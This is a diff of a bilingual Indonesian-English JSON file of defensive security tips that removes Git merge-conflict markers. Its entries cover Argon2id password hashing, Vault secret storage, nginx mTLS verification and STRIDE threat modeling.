    "id": "Kebutuhan memori besar Argon2id membuat cracking massal di GPU jauh lebih mahal dibanding bcrypt sekalipun.",
    "en": "Argon2id's high memory requirement makes mass GPU cracking far more expensive even compared to bcrypt."
@@ -1155,10 +999,7 @@
    "id": "Simpan secret di Vault, bukan di kode atau file .env; aplikasi mengambilnya saat runtime lewat token sementara.",
    "en": "Store secrets in Vault instead of in code or .env files; apps fetch them at runtime via a short-lived token."
   },
-<<<<<<< HEAD
   "cmd": "vault kv put secret/db password=\"s3cr3t\"",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Secret yang pernah ter-commit ke Git tetap ada di riwayatnya selamanya — selalu rotasi kalau sudah pernah bocor.",
    "en": "A secret once committed to Git stays in its history forever — always rotate it once it has ever leaked."
@@ -1177,10 +1018,7 @@
    "id": "Terbitkan sertifikat untuk tiap servis internal, lalu wajibkan verifikasi sertifikat klien di setiap koneksi antar servis.",
    "en": "Issue a certificate for each internal service, then require client certificate verification on every service-to-service connection."
   },
-<<<<<<< HEAD
   "cmd": "ssl_verify_client on;\nssl_client_certificate ca.pem;",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Di arsitektur microservice, mTLS mencegah servis palsu menyamar sebagai servis internal yang sah.",
    "en": "In a microservice architecture, mTLS prevents a rogue service from impersonating a legitimate internal one."
@@ -1199,10 +1037,7 @@
    "id": "Gambar diagram arsitektur, lalu untuk tiap komponen tanyakan: bisakah ia Spoofed, Tampered, Repudiated, dst.",
    "en": "Draw the architecture diagram, then for each component ask: can it be Spoofed, Tampered, Repudiated, etc."
   },
-<<<<<<< HEAD
   "cmd": "// S-T-R-I-D-E: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege",
-=======
->>>>>>> 139710653228b172a081280c0c37a037c1a953fb
   "tip": {
    "id": "Menemukan ancaman di atas kertas (desain) jauh lebih murah daripada menemukannya lewat insiden produksi.",
    "en": "Finding threats on paper (at design time) is far cheaper than finding them through a production incident."
